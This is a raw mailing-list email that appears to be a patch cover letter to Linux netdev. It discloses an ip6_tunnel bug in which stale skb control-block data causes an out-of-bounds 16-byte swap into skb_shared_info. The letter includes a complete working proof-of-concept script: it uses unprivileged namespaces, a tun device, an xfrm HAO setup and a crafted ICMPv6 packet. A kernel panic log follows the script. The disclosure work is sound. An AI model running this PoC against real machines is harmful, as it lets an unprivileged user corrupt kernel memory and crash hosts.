Received: from mail-pl1-f175.google.com (mail-pl1-f175.google.com [209.85.214.175])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B6B1F396561
	for <netdev@vger.kernel.org>; Mon,  3 Aug 2026 06:12:47 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.175
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785737571; cv=none; b=fuRa/75V2ppkhhBl+ZygY+zKU9+mizMclsFVREDvngo0P52SF2liVQOeE4DQhR4SwiPL0SOyJn1WgFnjD+8FoazoB4sVMPiBYp18/H/3izDnK7se2Ls3RUChUv6uIhiIx5EJT9UX0cpdc/NEjhFW7DEjNifP3vQ+TV5cybiNnT8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785737571; c=relaxed/simple;
	bh=fDkut50E/Y3gp+f+Bp2s+fQZCl9o5p/g56rlGd2K/AM=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=g57PFUx9V0nUWAE1bJ9Q3CPKa7u0M/aeZnpAN9XyXaMOl37J5HCswJzhqgBV+dpKi6APAynMpnPSACS1bqC8p0UaZgkm6UE3drMh5tarR4NKLp4Grc3807uN1NxvqH/GEXRb8rF0xllAwlviTm3isSzHyYXkNpc+z7+1FeL4yKY=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=d96z46Gk; arc=none smtp.client-ip=209.85.214.175
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="d96z46Gk"
Received: by mail-pl1-f175.google.com with SMTP id d9443c01a7336-2d0407aedd6so32145585ad.0
        for <netdev@vger.kernel.org>; Sun, 02 Aug 2026 23:12:47 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785737567; x=1786342367; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Bi6DmFLMrUMzGuRSEiaKlCGzHZ88kTiF9dbgVYFS5Gs=;
        b=d96z46GkKnT9l9Eg5BySPSmTZUbtltty2iM6Z7zyQdIdoTlZuTeFDEFX2ZgYje7KyO
         Vkw+sXuhifekMfeYfAAPAQQeCE2Z0keYEiSzgVOmB/6yuYGj+pse3uysUZTRa5sv+d9i
         V1p+WfTqd/T6I1cJS/uatTAbt3t+ujJay1k0O9J+DDqsR7sgsBJHgtb+28DZewl/Pz8x
         up1nKV5SO+If3hnQozLC0Oh6D9KY14WHiwHIZG/ib0a+WWBTdwdsHe3PhN8SNJjLadS+
         8q6uE6N0spEEA+65jGb7j76DO/S0qYaBpOotM609Zieh0uHbbqYsEZorqd/bsDan4g3F
         P3QA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785737567; x=1786342367;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Bi6DmFLMrUMzGuRSEiaKlCGzHZ88kTiF9dbgVYFS5Gs=;
        b=a+wBVk9gjpH3NnDug3bItXIsKgd9zMSKR4PsBavm+bxfXlHi2k4o9crTIIcdu/GwZC
         s5nKUuYyGee/gCgMq0xtUHf6D5FWB2NP8cN1HNV/eJJ3DmLkckqlK9GLFga2VfV0aA/0
         LcG+TB3T6XW5itqKk0RW7Kne5vUQ4vAADye2riGFCBsJs/T7/q2wi4PcxDssHWPTHT+i
         GnPJXSNBobw/s/3ybLEOds5Xq0JMF1mNWrU1Edo99O7SKUc/a1htguPp/NijBgDoe9WN
         vCiOXpnQY74OQl8g/AHdi+CuoyKnzSwmCh97EYjKeBBGYhUi77EjyFAGZLwa5X/P/KaY
         fyaw==
X-Gm-Message-State: AOJu0Yw0pFxyWTvnJrbNv/qTyencIMeGmPP8PN6AucftGIBn587xBuBh
	Yp0kINdiZTcSvfqbkrbxDUkGFIdzsktk9sVvDZDQ28JTkXudHhDQO/44TH7vV6sYPhW+0M+8WV4
	eMXdsITxpxn/z2w==
X-Gm-Gg: AR+sD13yROWAc3OE98cHO0Nh6kYpPCUg8OVmhNhx/H2A9bpEPkswv+hntRtN7FGAGp7
	1+4fvcL/vQj34eNdfc+k0RT0XVUM5xKLNotvUJApp26hedTbzGdLTCDnnES82cd43DKfkqTVRNj
	0Fi131sA1VI+bkfMQJ3g7dSqT9Nn9v9wtpohkrCQElqmRGLCZJFdwTU4tyMgdmGctwhfYsrUVMo
	HsYuFuJx0JAhDuLN/AgUE2+Byj04x1A87Png5PDYy5+og6glkD71DyvJRo6ut5PxE5ZG27MUPJB
	4unqPpbHdq7GoVYhe9DEWEJfxKaVLb32eJy/Flx/3lL5FNBCawYTKBlJItIO94nRZEszYj2suIg
	lbmywm5h1Fc1vdVi/Xd6HUnpQUxMa06XcpJRE4qTENcXTdq01f6BokhPxEtdoY1ukEbCaYW/rn6
	4n+yw2IShsn1QeCTDB2ar74djg+yCpJypSsff9JFWZXSUXJEiPn6F+H9oD6vnoZ49gD3gwoVR/f
	83jkk1EkwA8
X-Received: by 2002:a17:902:f54d:b0:2ca:e19c:986 with SMTP id d9443c01a7336-2d05221ef11mr87211905ad.1.1785737566530;
        Sun, 02 Aug 2026 23:12:46 -0700 (PDT)
Received: from Roxy.localdomain ([202.8.9.242])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d04ae18934sm32543905ad.11.2026.08.02.23.12.41
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 02 Aug 2026 23:12:45 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	yoshfuji@linux-ipv6.org,
	yasuyuki.kozakai@toshiba.co.jp,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] ip6_tunnel: clear skb2->cb[] in ip6ip6_err()
Date: Mon,  3 Aug 2026 14:12:32 +0800
Message-ID: <cover.1785736562.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/ipv6/ip6_tunnel.c. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ip6ip6_err() clones an outer IPv6 ICMP error skb, pulls it to the
quoted inner IPv6 packet, and then passes the clone to icmpv6_send().
The cloned skb keeps the outer packet's inet6_skb_parm in skb->cb.

If the outer packet carried a Home Address Option, IP6CB(skb2)->dsthao
remains non-zero after skb_pull(). icmp6_send() later calls
mip6_addr_swap(), which uses that stale dsthao offset against the
quoted inner packet.

The attached PoC makes the quoted inner packet start with an
attacker-controlled fake destination-options header at that stale
offset. ipv6_find_tlv() then returns the final byte of the quoted
packet as a fake HAO match, and mip6_addr_swap() performs a 16-byte
address swap past skb->tail into skb_shared_info.

On our test kernel this corrupts skb_shared_info and triggers a warning
in skb_release_data(), which panics the guest because panic_on_warn is
enabled.

Reproducer:

    chmod +x ./poc.sh
    ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

if [[ "${POC_INNER:-0}" != "1" ]]; then
	exec unshare -Urn env POC_INNER=1 bash "$0"
fi

TUN_IF="tuninj"
TNL_IF="tuntnl"
LOCAL="2001:db8:31::1"
CAREOF="2001:db8:31::2"
HOME="2001:db8:33::9"
INNER_SRC="7fff:ffff:ffff:ffff:ffff:ffff:ffff:ffff"
INNER_DST="2001:db8:32::200"
FAKE_LEN=168

cleanup() {
	ip link del "$TNL_IF" 2>/dev/null || true
	ip link del "$TUN_IF" 2>/dev/null || true
}
trap cleanup EXIT

ip tuntap add mode tun "$TUN_IF"
ip link set "$TUN_IF" up
ip -6 addr add "$LOCAL"/64 dev "$TUN_IF"

ip link add "$TNL_IF" type ip6tnl \
	local "$LOCAL" \
	remote "$CAREOF" \
	mode ip6ip6 \
	dev "$TUN_IF"
ip link set "$TNL_IF" up

ip xfrm state add \
	src "$HOME" \
	dst "$LOCAL" \
	proto hao \
	mode ro \
	coa "$CAREOF" \
	dir in

ip xfrm policy add \
	dir in \
	src "$HOME"/128 \
	dst "$LOCAL"/128 \
	tmpl src "$HOME" dst "$LOCAL" proto hao mode ro

python3 - <<'PY'
import fcntl
import ipaddress
import os
import struct

TUNSETIFF = 0x400454CA
IFF_TUN = 0x0001
IFF_NO_PI = 0x1000

LOCAL = "2001:db8:31::1"
CAREOF = "2001:db8:31::2"
HOME = "2001:db8:33::9"
INNER_SRC = "7fff:ffff:ffff:ffff:ffff:ffff:ffff:ffff"
INNER_DST = "2001:db8:32::200"
FAKE_LEN = 168
TUN_IF = b"tuninj"


def ipv6_header(src, dst, nexthdr, payload_len, hop_limit=64):
    return struct.pack(
        "!IHBB16s16s",
        6 << 28,
        payload_len,
        nexthdr,
        hop_limit,
        ipaddress.IPv6Address(src).packed,
        ipaddress.IPv6Address(dst).packed,
    )


def checksum(buf):
    if len(buf) & 1:
        buf += b"\x00"
    total = 0
    for i in range(0, len(buf), 2):
        total += (buf[i] << 8) | buf[i + 1]
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF


fake = bytearray(FAKE_LEN)
fake[0] = 59
fake[1] = (FAKE_LEN // 8) - 1
fake[-1] = 201

inner = ipv6_header(INNER_SRC, INNER_DST, 59, len(fake)) + fake
quoted = ipv6_header(LOCAL, CAREOF, 41, len(inner)) + inner

destopt = bytes([58, 2, 201, 16]) + ipaddress.IPv6Address(HOME).packed + (b"\x00" * 4)

icmp = bytearray(struct.pack("!BBHI", 1, 0, 0, 0) + quoted)
pseudo = (
    ipaddress.IPv6Address(HOME).packed
    + ipaddress.IPv6Address(LOCAL).packed
    + struct.pack("!I3xB", len(icmp), 58)
)
icmp[2:4] = struct.pack("!H", checksum(pseudo + icmp))

packet = ipv6_header(CAREOF, LOCAL, 60, len(destopt) + len(icmp)) + destopt + icmp

fd = os.open("/dev/net/tun", os.O_RDWR)
ifr = struct.pack("16sH", TUN_IF, IFF_TUN | IFF_NO_PI)
fcntl.ioctl(fd, TUNSETIFF, ifr)
os.write(fd, packet)
print("sent", len(packet))
os.close(fd)
PY

------END poc.sh--------

----BEGIN crash log----

[  253.382150][T10576] Kernel panic - not syncing: kernel: panic_on_warn set ...
[  253.383005][T10576] CPU: 1 UID: 1028 PID: 10576 Comm: python3 Not tainted 6.12.95 #2
[  253.383510][T10576] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  253.384404][T10576] Call Trace:
[  253.384667][T10576]  <TASK>
[  253.384921][T10576]  panic+0x533/0x610
[  253.385260][T10576]  ? __pfx_panic+0x10/0x10
[  253.385637][T10576]  ? skb_release_data+0x404/0x690
[  253.386034][T10576]  check_panic_on_warn+0x61/0x80
[  253.386471][T10576]  __warn+0xdf/0x2e0
[  253.386767][T10576]  ? skb_release_data+0x404/0x690
[  253.387201][T10576]  report_bug+0x308/0x3d0
[  253.387558][T10576]  handle_bug+0x111/0x150
[  253.388031][T10576]  exc_invalid_op+0x17/0x50
[  253.388428][T10576]  asm_exc_invalid_op+0x1a/0x20
[  253.388773][T10576] RIP: 0010:skb_release_data+0x404/0x690
[  253.389169][T10576] Code: 28 30 0f 89 77 ff ff ff 48 89 7c 24 18 e8 24 e0 fe ff 48 8b 7c 24 18 84 c0 0f 85 6f ff ff ff 40 f6 c7 01 0f 84 60 ff ff ff 90 <0f> 0b 90 31 ff e9 55 ff ff ff 48 8d 7d 08 48 b8 00 00 00 00 00 fc
[  253.390526][T10576] RSP: 0018:ffffc900141bf6b8 EFLAGS: 00010202
[  253.390911][T10576] RAX: 0000000000000000 RBX: ffff888064c5be00 RCX: 0000000000000001
[  253.391419][T10576] RDX: 0000000000000002 RSI: 1ffff11021c6903e RDI: 6b6b6b6b6b6b6b6b
[  253.391923][T10576] RBP: ffff88810e3481c0 R08: 0000000000000000 R09: ffffed1021c6903c
[  253.392423][T10576] R10: ffff88810e3481e3 R11: 0000000000000003 R12: ffff88810e3481f0
[  253.393012][T10576] R13: ffff888064c5be7e R14: 0000000000000000 R15: dffffc0000000000
[  253.393628][T10576]  ? skb_release_data+0xc4/0x690
[  253.394013][T10576]  sk_skb_reason_drop+0xb0/0x100
[  253.394333][T10576]  icmpv6_rcv+0xa4f/0x1830
[  253.394674][T10576]  ip6_protocol_deliver_rcu+0xcb7/0x1450
[  253.395115][T10576]  ? trace_lock_acquire+0x145/0x1c0
[  253.395626][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.396064][T10576]  ? __pfx_ipv6_rcv+0x10/0x10
[  253.396452][T10576]  ip6_input_finish+0x11b/0x240
[  253.396759][T10576]  ? ip6_input+0x78/0xb0
[  253.397109][T10576]  __netif_receive_skb_one_core+0x11a/0x1b0
[  253.397564][T10576]  ? __pfx___netif_receive_skb_one_core+0x10/0x10
[  253.398041][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.398412][T10576]  ? lock_acquire+0x2f/0xb0
[  253.398707][T10576]  ? netif_receive_skb+0xcc/0x5a0
[  253.399044][T10576]  netif_receive_skb+0xfb/0x5a0
[  253.399360][T10576]  ? __pfx_netif_receive_skb+0x10/0x10
[  253.399725][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.400136][T10576]  ? __pfx___lock_acquire+0x10/0x10
[  253.400469][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.400861][T10576]  tun_rx_batched+0x3ed/0x7f0
[  253.401178][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.401536][T10576]  ? __pfx_tun_rx_batched+0x10/0x10
[  253.401879][T10576]  ? tun_get_user+0xab0/0x32a0
[  253.402197][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.402554][T10576]  ? lock_acquire+0x2f/0xb0
[  253.402845][T10576]  ? tun_get_user+0xab0/0x32a0
[  253.403173][T10576]  tun_get_user+0x201c/0x32a0
[  253.403498][T10576]  ? __pfx___lock_acquire+0x10/0x10
[  253.403843][T10576]  ? __pfx_tun_get_user+0x10/0x10
[  253.404178][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.404539][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.404898][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.405279][T10576]  ? lb_tx_method_get+0x40/0xf0
[  253.405621][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.406005][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.406378][T10576]  tun_chr_write_iter+0xba/0x1b0
[  253.406711][T10576]  vfs_write+0x604/0xf30
[  253.406998][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.407465][T10576]  ? __tun_chr_ioctl+0xc04/0x3ac0
[  253.407795][T10576]  ? __pfx_vfs_write+0x10/0x10
[  253.408127][T10576]  ? __pfx___tun_chr_ioctl+0x10/0x10
[  253.408517][T10576]  ksys_write+0xfb/0x1d0
[  253.408791][T10576]  ? __pfx_ksys_write+0x10/0x10
[  253.409114][T10576]  ? srso_alias_return_thunk+0x5/0xfbef5
[  253.409490][T10576]  do_syscall_64+0xc7/0x270
[  253.409836][T10576]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  253.410334][T10576] RIP: 0033:0x7f3925833687
[  253.410623][T10576] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[  253.411839][T10576] RSP: 002b:00007fff69998b20 EFLAGS: 00000202 ORIG_RAX: 0000000000000001
[  253.412402][T10576] RAX: ffffffffffffffda RBX: 00007f392579f780 RCX: 00007f3925833687
[  253.412908][T10576] RDX: 0000000000000140 RSI: 00007f392512cd40 RDI: 0000000000000003
[  253.413427][T10576] RBP: 00007f392579f700 R08: 0000000000000000 R09: 0000000000000000
[  253.413926][T10576] R10: 0000000000000000 R11: 0000000000000202 R12: 00007f392512cd40
[  253.414697][T10576] R13: 0000000000000003 R14: 0000000000a83590 R15: 00007f3925adb088
[  253.415232][T10576]  </TASK>
[  253.415637][T10576] Kernel Offset: disabled
[  253.415930][T10576] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ip6_tunnel: clear skb2->cb[] in ip6ip6_err()

 net/ipv6/ip6_tunnel.c | 3 +++
 1 file changed, 3 insertions(+)

-- 
2.43.0

